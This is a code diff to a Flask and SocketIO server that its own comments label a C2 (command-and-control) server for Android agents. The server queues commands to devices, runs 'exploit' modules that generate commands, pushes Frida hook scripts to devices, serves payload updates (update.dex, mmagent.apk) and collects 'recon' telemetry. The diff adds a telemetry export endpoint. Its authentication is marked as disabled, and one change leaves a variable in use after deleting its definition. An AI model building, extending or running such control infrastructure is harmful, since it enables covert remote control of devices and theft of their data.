@@ -5,6 +5,7 @@ from flask import Flask, request, jsonify, abort, send_file, render_template
 from flask_cors import CORS
 from flask_socketio import SocketIO, emit
 import os
+import json
 import time
 import base64
 import subprocess
@@ -20,6 +21,7 @@ command_queue = {}
 result_store = {}
 connected_agents = {}
 agent_sockets = {}
+agent_telemetry = {}
 
 # === Auth Middleware (disabled temporarily for dev/testing) ===
 @app.before_request
@@ -75,8 +77,20 @@ def list_agents():
         meta_copy = meta.copy()
         meta_copy["device_id"] = device_id
         meta_copy["online"] = (now - meta["last_seen"]) < 60
+        meta_copy["telemetry"] = agent_telemetry.get(device_id, {})
         agents.append(meta_copy)
     return jsonify(agents)
+
+@app.route("/exported_telemetry/<device_id>", methods=["GET"])
+def export_telemetry(device_id):
+    telemetry = agent_telemetry.get(device_id)
+    if not telemetry:
+        return jsonify({"error": "No telemetry available"}), 404
+    filepath = os.path.join("uploads", f"{device_id}_telemetry.json")
+    os.makedirs("uploads", exist_ok=True)
+    with open(filepath, "w") as f:
+        json.dump(telemetry, f, indent=2)
+    return send_file(filepath, mimetype="application/json", as_attachment=True)
 
 # === Poll-based C2 commands ===
 @app.route("/api/send_command", methods=["POST"])
@@ -108,7 +122,7 @@ def receive_result():
 def get_result(device_id):
     return jsonify({"result": result_store.get(device_id)})
 
- # === Manual Output & Command Endpoint (for debugging) ===
+# === Manual Output & Command Endpoint (for debugging) ===
 @app.route("/post_output", methods=["POST"])
 def post_output():
     data = request.json
@@ -145,7 +159,6 @@ def generic_exploit(module_name):
         component = data.get("component") 
         module = __import__(f"modules.{module_name}", fromlist=["generate_command"])
         command = module.generate_command(package, component)
-        device_id = data.get("device_id")
         command_queue[device_id] = (command , {})
         return jsonify({"status": "queued", "command": command})
     except Exception as e:
@@ -172,13 +185,13 @@ def upload():
 def push_frida_hook():
     data = request.json
     device_id = data.get("device_id")
-    hook_script = data.get("script_name")  # e.g., "dynamic_reflection.js"
+    hook_script = data.get("script_name")
     sid = agent_sockets.get(device_id)
     path = os.path.join("frida_hooks", hook_script)
     if not os.path.exists(path):
         return jsonify({"error": "Hook file not found"}), 404
     if sid:
-        with open(f"frida_hooks/{hook_script}", "r") as f:
+        with open(path, "r") as f:
             js_code = f.read()
         socketio.emit("load_frida_script", {"script": js_code}, to=sid)
         return jsonify({"status": "hook sent"})
@@ -195,12 +208,11 @@ def check_update():
     latest_dex = "update.dex"
     latest_apk = "mmagent.apk"
     latest_version = "2.0"
-
     if current_version != latest_version:
         return jsonify({
             "update_available": True,
             "type": "dex",  # or "apk"
-            "filename": latest_dex if "dex" else latest_apk,
+            "filename": latest_dex,
             "version": latest_version
         })
     return jsonify({"update_available": False})
@@ -220,7 +232,7 @@ def upload_base64():
         return jsonify({"status": "uploaded"})
     except Exception as e:
         return jsonify({"error": str (e)}), 500
-    
+
 # === Flask Base64 File Download ===
 @app.route("/download_base64/<filename>", methods=["GET"])
 def download_base64(filename):
@@ -234,20 +246,18 @@ def download_base64(filename):
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-#=== Incorporate Dyna.py in the UI ===
+# === Incorporate Dyna.py in the UI ===
 @app.route("/run_dyna", methods=["POST"])
 def run_dyna():
     data = request.json
-    #device_id = data.get("device_id")
     apk_path = data.get("apk_path")
     package_name = data.get("package_name")
     if not all([apk_path, package_name]):
         return jsonify({"status": "error", "message": "Missing apk_path or package_name"}), 400
-    # You can import dyna.py as a module or call it as a subprocess
     try: 
         result = subprocess.check_output(
             ["python3", "dyna.py", "--apk", apk_path, "--pkg", package_name, "--format", "html"],
-            stderr==subprocess.STDOUT
+            stderr=subprocess.STDOUT
         ).decode()
         return jsonify({"status": "success", "output": result})
     except subprocess.CalledProcessError as e:
@@ -275,8 +285,12 @@ def register_agent(data):
 def on_command_result(data):
     device_id = data.get("device_id")
     result = data.get("result")
+    if isinstance(result, dict):
+        agent_telemetry[device_id] = result
+        print(f"[Recon from {device_id}] {json.dumps(result, indent=2)}")
+    else:
+        print(f"[<] Output from {device_id}:\n{result}")
     result_store[device_id] = result
-    print(f"[<] WebSocket Result from {device_id}:\n{result}")
 
 @socketio.on('send_command')
 def send_command(data):
